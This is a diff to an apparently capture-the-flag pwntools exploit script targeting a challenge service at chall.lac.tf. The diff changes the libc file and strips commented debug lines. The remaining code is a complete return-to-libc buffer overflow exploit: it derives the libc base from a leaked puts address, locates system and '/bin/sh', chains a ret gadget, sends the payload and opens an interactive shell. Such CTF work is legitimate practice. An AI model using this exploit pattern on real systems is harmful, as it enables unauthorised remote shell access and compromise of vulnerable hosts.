@@ -5,7 +5,7 @@ io = pwn.remote('chall.lac.tf', 31284)
 # io: pwn.tubes.tube.tube = pwn.gdb.debug(
 #     "./sus", "b *0x4011a2", env={"LD_PRELOAD": ""}
 # )
-libc = pwn.ELF('./libc3.so.6')
+libc = pwn.ELF('./libc.so.6')
 ld = pwn.ELF('./ld-linux-x86-64.so.2')
 
 payload = b''
@@ -29,19 +29,12 @@ libc_base = leak - libc.sym['puts']
 binsh = next(libc.search(b'/bin/sh\x00')) + libc_base
 sys = libc.symbols['system'] + libc_base
 rop = pwn.ROP(libc)
-# print(rop.find_gadget(['ret']).address)
-# print(type(rop.find_gadget(['ret']).address))
-# print(type(libc_base))
-# rop.raw(rop.find_gadget(['ret']).address + libc_base)
 
 payload = b''
 payload += b'A' * offset
 payload += pwn.p64(binsh) # rdi
 payload += pwn.p64(1)
 payload += pwn.p64(rop.find_gadget(['ret']).address + libc_base)
-# payload += rop.chain()
-# payload += b'\x00' * 4
 payload += pwn.p64(sys)
-# payload += pwn.p64(e.sym['main'])
 io.sendline(payload)
 io.interactive()
